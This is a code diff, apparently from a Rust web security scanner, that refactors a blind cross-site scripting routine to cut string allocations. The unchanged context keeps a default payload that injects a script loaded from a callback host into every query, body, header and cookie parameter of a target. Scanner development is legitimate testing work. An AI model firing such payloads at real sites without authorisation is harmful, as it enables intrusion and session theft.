@@ -7,36 +7,36 @@ pub async fn blind_scanning(target: &Target, callback_url: &str) {
         .unwrap_or("\"'><script src={}></script>");
     let payload = template.replace("{}", callback_url);
 
-    // Collect all params
-    let mut all_params = vec![];
+    // Collect all params with static str types to avoid per-param String allocation
+    let mut all_params: Vec<(String, &str)> = Vec::new();
 
     // Query params
-    for (k, v) in target.url.query_pairs() {
-        all_params.push((k.to_string(), v.to_string(), "query".to_string()));
+    for (k, _v) in target.url.query_pairs() {
+        all_params.push((k.into_owned(), "query"));
     }
 
     // Body params
     if let Some(data) = &target.data {
         for pair in data.split('&') {
-            if let Some((k, v)) = pair.split_once('=') {
-                all_params.push((k.to_string(), v.to_string(), "body".to_string()));
+            if let Some((k, _v)) = pair.split_once('=') {
+                all_params.push((k.to_string(), "body"));
             }
         }
     }
 
     // Headers
-    for (k, v) in &target.headers {
-        all_params.push((k.to_string(), v.to_string(), "header".to_string()));
+    for (k, _v) in &target.headers {
+        all_params.push((k.clone(), "header"));
     }
 
     // Cookies
-    for (k, v) in &target.cookies {
-        all_params.push((k.to_string(), v.to_string(), "cookie".to_string()));
+    for (k, _v) in &target.cookies {
+        all_params.push((k.clone(), "cookie"));
     }
 
     // Send requests for each param
-    for (param_name, _, param_type) in all_params {
-        send_blind_request(target, &param_name, &payload, &param_type).await;
+    for (param_name, param_type) in &all_params {
+        send_blind_request(target, param_name, &payload, param_type).await;
     }
 }
 
@@ -126,11 +126,15 @@ async fn send_blind_request(target: &Target, param_name: &str, payload: &str, pa
     if let Some(ua) = &target.user_agent {
         request = request.header("User-Agent", ua);
     }
-    let cookie_header = cookies
-        .iter()
-        .map(|(k, v)| format!("{}={}", k, v))
-        .collect::<Vec<_>>()
-        .join("; ");
+    let mut cookie_header = String::new();
+    for (i, (k, v)) in cookies.iter().enumerate() {
+        if i > 0 {
+            cookie_header.push_str("; ");
+        }
+        cookie_header.push_str(k);
+        cookie_header.push('=');
+        cookie_header.push_str(v);
+    }
     if !cookie_header.is_empty() {
         request = request.header("Cookie", cookie_header);
     }
